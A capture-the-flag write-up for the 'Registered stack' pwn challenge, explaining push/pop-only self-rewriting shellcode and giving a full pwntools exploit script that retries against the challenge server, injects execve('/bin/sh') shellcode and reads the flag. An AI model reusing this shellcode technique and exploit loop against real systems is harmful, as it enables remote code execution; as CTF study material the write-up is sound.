# srdnlen ctf 2026

participated as 0xl4ugh

## Registered stack
<primary-label ref="pwn"/>

In this chal, we can send shellcode with restriction: "only pop and push".

This was funny asm jail.

My strategy was assembling self-rewrite shellcode that execute `read(0,rwx,good length)`.

Before our shellcode execute, most of the registers without rsp have been cleared.

So, the condition of `read(0,rwx,good length)` in initial:

- eax=0 <- no need
- edi=0 <- no need
- rsi=rwx
- rdx=good length

second, how I set rdx is just pop from shellcode with using `pop dx`.

third, we can simply implement rsi=rwx with `push rsp; pop rsi;`. take care not to break the existing shellcode.

finally, we need `syscall`(0x0f 0x05).

To prepare 0x0f, I used `push fs`(0x0f 0x50).
To prepare 0x05, I used randomized value of shellcode address. So we need 1/256 luck of ASLR.

```py
import inspect
import re
import sys
from http.client import CONTINUE

from icecream import ic
from pwn import *

e = ELF("registered_stack", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2", checksec=False)

nc = "nc registered-stack.challs.srdnlen.it 1090"
if "nc" in nc:
    HOST = nc.split(" ")[1]
    PORT = int(nc.split(" ")[2])
if "http" in nc:
    from urllib.parse import urlparse

    HOST = urlparse(nc).hostname
    PORT = urlparse(nc).port

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    b *main+310
    vmmap /dev
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST, port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io, g_script)

s = lambda b: io.send(b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda b: io.sendline(b)
sln = lambda b: io.sendline(str(b).encode())
sla = lambda a, b: io.sendlineafter(a, b)
r = lambda: io.recv(timeout=1)
ru = lambda b: io.recvuntil(b)
rl = lambda: io.recvline()
pu32 = lambda b: u32(b.ljust(4, b"\0"))
pu64 = lambda b: u64(b.ljust(8, b"\0"))
fsp = lambda b: f"%{b}$p".encode()
shell = lambda: io.interactive()


def hl(v: int):
    print(
        f"{(m := re.search(r'hl\s*\(\s*(.+?)\s*\)', inspect.getframeinfo(inspect.currentframe().f_back).code_context[0].strip())) and m.group(1) or '?'}: {hex(v)}"
    )


payload = b""


def rst():
    global payload
    payload = b""
    log.info("***PAYLOAD RESET***")


def pay(*args, **kwargs):
    global payload
    payload += b"".join(
        [
            a if type(a) == bytes else (a.encode() if type(a) == str else p64(a))
            for a in args
        ]
    )


while 1:
    # io = e.process()
    io = remote(host=HOST, port=PORT)
    a = asm("""
        pop dx
        pop dx
        pop dx
        pop dx
        pop dx
        pop dx
        pop dx
        pop dx
        push rsp
        pop rsi
        push rsi
        pop bp
        pop bp
        pop rbx
        pop rbx
        pop rbx
        pop rbx
        push ax
        push ax
        push ax
        push bp
        push fs
        """)

    r()
    sl(a.hex())

    a = b"\x90" * 0x15
    a += asm("""
        xor rsi,rsi
        push rsi
        mov rdi,0x68732f2f6e69622f
        push rdi
        push rsp
        pop rdi
        push 59
        pop rax
        cdq
        syscall
        """)

    sl(a)

    try:
        sl(b"cat flag*")
        print(r())
        shell()
        break
    except EOFError:
        continue
    # shell()

```